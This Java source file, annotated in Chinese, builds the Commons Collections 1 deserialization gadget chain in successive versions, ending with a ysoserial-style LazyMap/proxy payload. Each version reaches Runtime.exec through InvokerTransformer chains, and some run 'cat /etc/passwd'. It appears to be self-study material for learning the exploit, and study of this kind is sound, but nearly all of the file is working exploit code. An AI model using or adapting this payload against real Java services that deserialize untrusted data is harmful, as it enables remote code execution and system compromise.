package cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.map.LazyMap;

import java.lang.annotation.Target;
import java.lang.invoke.ConstantCallSite;
import java.lang.reflect.*;
import java.util.HashSet;
import java.util.Map.Entry;

import java.beans.PropertyEditor;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Map;

import toolkit.Seriliazation;

public class CC1Chain {
    // private static String injectedCmd = "/System/Volumes/Preboot/Cryptexes/App/System/Applications/Safari.app/Contents/MacOS/Safari";
    private static String injectedCmd = "chromium";

    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException {
        // v0 朴素版本反射进行代码执行
        // cc1_v0();

        // v1 直接构造 InvokeTransformer 进行代码执行
        // cc1_v1();

        // v2 调用 TransformedMap.decorate -> checkSetValue -> InvokeTransforms.transform(runtime) -> runtime.exec
        // cc1_v2();

        // v3 自动调用 checkSetValue
        // cc1_v3();

        // v4
        // cc1_v4();

        // v5 完整版
        // cc1_v5();

        // v6 另一条链
        cc1_v6();

        // 不退出
        // 取消注释 if hostos == macos
        // System.out.println("suspending");
        // suspend();
    }

    /**
     * v0
     * 朴素版本使用反射进行任意代码执行
     */
    public static void cc1_v0() throws InvocationTargetException, IllegalAccessException, NoSuchMethodException {
        // 执行系统命令
        // Process process = Runtime.getRuntime().exec("cat /etc/passwd");

        Runtime runtime = Runtime.getRuntime();

        Class clazz = Runtime.class;
        Method methodExec = clazz.getDeclaredMethod("exec", String.class);
        methodExec.setAccessible(true);
        Process process = (Process) methodExec.invoke(runtime, "cat /etc/passwd");

        outputResult(process);
    }


    /**
     * v1 找到了 sink 点
     * org.apache.commons.collections.functors.InvokerTransformer#transform(java.lang.Object)
     * 存在反射调用 invoke，导致 rce 的风险
     * method.invoke(input, iArgs);
     * 使用 InvokeTransformer 进行代码执行
     */
    public static void cc1_v1() {
        // 存在危险方法的类 - Runtime 的 invoke
        Runtime runtime = Runtime.getRuntime();

        // 构造：String methodName, Class[] paramTypes, Object[] args
        InvokerTransformer invokerTransformer = new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new Object[] {"cat /etc/passwd"}
        );

        Process process = (Process) invokerTransformer.transform(runtime);

        outputResult(process);
    }


    /**
     * v2 - 寻找谁调用了 InvokeTransformer 的 transform
     * org.apache.commons.collections.map.TransformedMap
     * 该类的 checkSetValue 调用了 valueTransformer.transform(value)
     * 而 valueTransformer 是个 protected final Transformer 类型的成员变量
     *
     * 如何触发 checkSetValue？
     * -> org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue(java.lang.Object)
     * AbstractInputCheckedMapDecorator 这个类是 TransformedMap 的父类
     *
     * 如何触发 TransformedMap 继承的父类方法 AbstractInputCheckedMapDecorator.MapEntry.setValue？
     * 遍历这个 map，每个 kv 组成一个 MapEntry
     *
     * 谁创建了 TransformedMap？
     * 构造方法无法直接创建，因为是 protected
     * decorate 是 public 的，可以使用 decorate
     *
     * 因此目前的链结构为：
     * TransformedMap.decorate()，传入 map 和 k,v 两个 Transformer
     *  - 创建 TransformedMap
     *      - 访问 TransformedMap 重写的抽象方法 checkSetValue()
     *          - 访问 map 的 v 对应的 valueTransformer (使用 InvokeTransformer 赋值)
     *              - 访问 InvokeTransformer 的 transform(0
     *                  - 调用传入方法的 method.invoke() (exec, 危险方法)
     */
    public static void cc1_v2() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        // 1. 创建一个入口类，用于包裹危险类
        HashMap<Object, Object> hashMap = new HashMap<Object, Object>();

        // 2. 创建危险方法寄居的危险类
        // 接收参数：String methodName, Class[] paramTypes, Object[] args
        // -> Runtime.getRuntime().exec("cat /etc/passwd")
        InvokerTransformer invokerTransformer = new InvokerTransformer(
                "exec",             // 方法名
                new Class[]{String.class},      // 参数类型
                new Object[]{"cat /etc/passwd"} // 参数
        );

        Runtime runtime = Runtime.getRuntime();

        // 3. 创建攻击链第一环
        // 接收参数：Map map, Transformer keyTransformer, Transformer valueTransformer
        // 只需要调用 value 的 Transformer
        TransformedMap transformedMap = (TransformedMap) TransformedMap.decorate(hashMap, null, invokerTransformer);

        // 4. 反射访问 TransformedMap 的 protected 方法 checkSetValue
        Class clazz_transformedMap = TransformedMap.class;
        Method method_checkSetValue = clazz_transformedMap.getDeclaredMethod("checkSetValue", Object.class);
        method_checkSetValue.setAccessible(true);
        Process process = (Process) method_checkSetValue.invoke(transformedMap, runtime);
        outputResult(process);
    }


    /**
     * v3 - 寻找谁调用了 InvokeTransformer 的 transform
     * org.apache.commons.collections.map.TransformedMap
     * 该类的 checkSetValue 调用了 valueTransformer.transform(value)
     * 而 valueTransformer 是个 protected final Transformer 类型的成员变量
     *
     * 如何触发 checkSetValue？
     * -> org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue(java.lang.Object)
     * AbstractInputCheckedMapDecorator 这个类是 TransformedMap 的父类
     *
     * 如何触发 TransformedMap 继承的父类方法 AbstractInputCheckedMapDecorator.MapEntry.setValue？
     * 遍历这个 map，每个 kv 组成一个 MapEntry
     *
     * 谁创建了 TransformedMap？
     * 构造方法无法直接创建，因为是 protected
     * decorate 是 public 的，可以使用 decorate
     *
     * 因此目前的链结构为：
     * TransformedMap.decorate()，传入 map 和 k,v 两个 Transformer
     *  - 创建 TransformedMap
     *      - 遍历 TransformedMap ✨
     *          - 访问从父类继承的 AbstractInputCheckedMapDecorator.MapEntry.setValue() ✨
     *              - 访问 TransformedMap 重写的抽象方法 checkSetValue()
     *                  - 访问 map 的 v 对应的 valueTransformer (使用 InvokeTransformer 赋值)
     *                      - 访问 InvokeTransformer 的 transform()
     *                          - 调用传入方法的 method.invoke() (exec, 危险方法)
     *
     */
    public static void cc1_v3() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        // 1. 创建一个入口类，用于包裹危险类
        HashMap<Object, Object> hashMap = new HashMap<Object, Object>();

        // 2. 创建危险方法寄居的危险类
        // 接收参数：String methodName, Class[] paramTypes, Object[] args
        // -> Runtime.getRuntime().exec("cat /etc/passwd")
        InvokerTransformer invokerTransformer = new InvokerTransformer(
                "exec",             // 方法名
                new Class[]{String.class},      // 参数类型
                new Object[]{"/System/Volumes/Preboot/Cryptexes/App/System/Applications/Safari.app/Contents/MacOS/Safari"} // 参数
        );

        Runtime runtime = Runtime.getRuntime();

        // 3. 创建攻击链第一环
        // 接收参数：Map map, Transformer keyTransformer, Transformer valueTransformer
        // 只需要调用 value 的 Transformer
        Map<Object, Object> transformedMap =  TransformedMap.decorate(hashMap, null, invokerTransformer);

        // 4. 只需要遍历这个 Map，插入元素就可以自动访问 setValue() -> checkSetValue() 了
        hashMap.put("key", "value");
        for (Entry entry : transformedMap.entrySet()) {
            // 通过 setValue 调用 checkSetValue
            // 插入的 value 就是 transform（value） 的对象
            // Process process = (Process) entry.setValue(runtime);
            // outputResult(process);
            entry.setValue(runtime);
            break;
        }
    }


    /**
     * v4 希望找到一个类，该类的 readObject 能够调用 setValue，也就是主动便利一个 Map
     * sun.reflect.annotation.AnnotationInvocationHandler
     * 该类的 readObject 在反序列化时会遍历 memberValues
     * 该变量是可控的，因为直接可以通过构造函数传进来
     * 但是该类是 private，需要反射进行构造
     */
    public static void cc1_v4() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        // 1. 创建一个入口类，用于包裹危险类
        HashMap<Object, Object> hashMap = new HashMap<Object, Object>();

        // 构造可序列化的 runtime

        // 获得 getRuntime 方法
        // 接收参数：String name, Class<?>... parameterTypes
        Method methodGetRuntime = (Method) new InvokerTransformer(
                "getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", null}
        ).transform(Runtime.class);

        // 调用 getRuntime
        // 接收参数：Object obj, Object... args
        Runtime runtime = (Runtime) new InvokerTransformer(
                "invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, null}
        ).transform(methodGetRuntime);


        // 2. 创建危险方法寄居的危险类
        // 接收参数：String methodName, Class[] paramTypes, Object[] args
        // -> Runtime.getRuntime().exec("cat /etc/passwd")
        // 调用 exec
        InvokerTransformer invokerTransformer = new InvokerTransformer(
                "exec",             // 方法名
                new Class[]{String.class},      // 参数类型
                new Object[]{"/System/Volumes/Preboot/Cryptexes/App/System/Applications/Safari.app/Contents/MacOS/Safari"} // 参数
        );

        // invokerTransformer.transform(runtime);

        // 3. 创建 Map
        // 接收参数：Map map, Transformer keyTransformer, Transformer valueTransformer
        // 只需要调用 value 的 Transformer
        Map<Object, Object> transformedMap =  TransformedMap.decorate(hashMap, null, invokerTransformer);
        // hashMap.put("value", runtime);

        // 4. 【真正的链首】通过序列化 AnnotationInvocationHandler，在反序列化时自动遍历 map
        // 因为他有 readObject，并且调用了 setValue
        Class clazz_annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

        // 接收参数：Class<? extends Annotation> type, Map<String, Object> memberValues
        Constructor constructorAnnotationInvocationHandler = clazz_annotationInvocationHandler.getDeclaredConstructor(
                Class.class,
                Map.class
        );

        // 构造对象
        constructorAnnotationInvocationHandler.setAccessible(true);
        Object annotationInvocationHandler = constructorAnnotationInvocationHandler.newInstance(
                Target.class,
                transformedMap
        );

        // 5. 序列化
        Seriliazation.serialize(annotationInvocationHandler);

        // 6. 反序列化
        Seriliazation.unserialize("ser.bin");
    }


    /**
     * v5 封装成 chain
     */
    public static void cc1_v5() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        Transformer[] transformers = new Transformer[] {
                // 返回一个 Runtime 类: Class clazz = Runtime.class;
                // 因为在 sun.reflect.annotation.AnnotationInvocationHandler.readObject 中
                // setValue 插入的是一个 AnnotationTypeMismatchExceptionProxy 类型
                // 因此 transform （AnnotationTypeMismatchExceptionProxy）需要返回一个 Runtime
                // 这样后续才能执行任意代码
                new ConstantTransformer(Runtime.class),

                // Method method = (Method) clazz.getMethod("getRuntime", null)
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}
                ),

                // Runtime runtime = method.invoke("getRuntime", null)
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}
                ),

                // runtime.exec("/System/Volumes/Preboot/Cryptexes/App/System/Applications/Safari.app/Contents/MacOS/Safari")
                new InvokerTransformer(
                        "exec",             // 方法名
                        new Class[]{String.class},      // 参数类型
                        new Object[]{injectedCmd} // 参数
                )
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
        hashMap.put("value", "xxx");

        Map transformedMap =  TransformedMap.decorate(hashMap, null, chainedTransformer);

        // 存在 readObject 的可序列化的类
        String entryClass = "sun.reflect.annotation.AnnotationInvocationHandler";
        Class clazzAIHandler = Class.forName(entryClass);

        // 接收参数：Class<? extends Annotation> type, Map<String, Object> memberValues
        Constructor constructorAIHandler = clazzAIHandler.getDeclaredConstructor(Class.class, Map.class);

        // 构造对象
        constructorAIHandler.setAccessible(true);
        Object AIHandler = constructorAIHandler.newInstance(Target.class, transformedMap);

        Seriliazation.serialize(AIHandler);
        Seriliazation.unserialize("ser.bin");
    }

    /**
     * v6 ysoserial 版本
     * -
     */
    public static void cc1_v6() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{injectedCmd}),
                new ConstantTransformer(new HashSet<String>())
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 使用 LazyMap，不用 TransformedMap
        /**
         * AnnotationInvocationHandler.readObject()
         *      -> Map(proxy).entrySet()
         *          -> AnnotationInvocationHandler.invoke()
         *              -> LazyMap.get()
         *                  -> factory.transform(key) (protected final Transformer factory)
         */

        // 构造一个 LazyMap
        LazyMap lazyMap = (LazyMap) LazyMap.decorate((Map) new HashMap(), chainedTransformer);

        // 构造一个代理
        String entryClass = "sun.reflect.annotation.AnnotationInvocationHandler";
        Class clazzAIHandler = Class.forName(entryClass);

        Constructor constructorAIHandler = clazzAIHandler.getDeclaredConstructor(Class.class, Map.class);
        constructorAIHandler.setAccessible(true);

        // 用于代理一个 lazymap，会在调用 entrySet 的时候必然走到 invoke 里，在 invoke 里调用 get，在 get 中调用 Transformer
        InvocationHandler AIHandler = (InvocationHandler) constructorAIHandler.newInstance(Override.class, lazyMap);

        // 接收参数：ClassLoader loader, Class<?>[] interfaces, InvocationHandler h
        Map mapProxy = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, AIHandler);

        // 用于反序列化的对象，readObject 的时候会调用里面 map 的 entrySet
        InvocationHandler h = (InvocationHandler) constructorAIHandler.newInstance(Override.class, mapProxy);

        Seriliazation.serialize(h);
        Seriliazation.unserialize("ser.bin");
    }

    public static void outputResult(Process process) {
        try {
            // 获取命令执行结果的输入流
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

            String line;
            StringBuilder result = new StringBuilder();

            // 逐行读取输入流中的内容
            while ((line = reader.readLine()) != null) {
                result.append(line).append("\n");
            }

            // 关闭输入流
            reader.close();

            // 等待命令执行完成，并获取退出状态码
            int exitCode = process.waitFor();

            // 输出命令执行结果和退出状态码
            System.out.println("命令执行结果：");
            System.out.println(result.toString());
            System.out.println("命令退出状态码：" + exitCode);

        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    private static void suspend() {
        try {
            // 让主线程进入长时间休眠，实现挂起
            Thread.sleep(Long.MAX_VALUE);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}